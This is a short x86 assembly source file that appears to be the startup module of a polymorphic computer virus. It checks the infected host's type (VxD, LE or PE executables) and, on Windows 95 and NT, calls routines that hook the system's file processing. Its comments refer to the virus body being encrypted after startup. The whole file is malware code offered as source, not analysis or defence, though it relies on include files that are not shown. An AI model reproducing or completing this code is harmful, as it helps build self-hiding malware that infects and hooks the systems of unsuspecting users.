
ifndef PASS2
include globals.1
else
include globals.2
endif

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature


startup:
         cmp     initialize, 0
         je      cont
         ret
cont:
         ; initialize polymorphic body (at startup time body isn't encrypted)

         cmp  host_type, HOST_UNKNOWN
         je   nothing2do                ; unknown host
         cmp  host_type, HOST_VXD
         je   nothing2do                ; got control of processing
         cmp  host_type, HOST_LEEXE
         je   fullhook
         cmp  host_type, HOST_PEDRP
         je   fullhook
;         cmp  host_type, HOST_PEFULL
         jmp  nothing2do                ; have small control of file processing
fullhook:
         test system, SYS_WIN95
         jz   skip_init95
         mod_call md_hookVxD
skip_init95:
         test system, SYS_WINNT
         jz   skip_initNT
         mod_call md_hookNT
skip_initNT:

nothing2do:
         ret

indep_mod       ends

                end
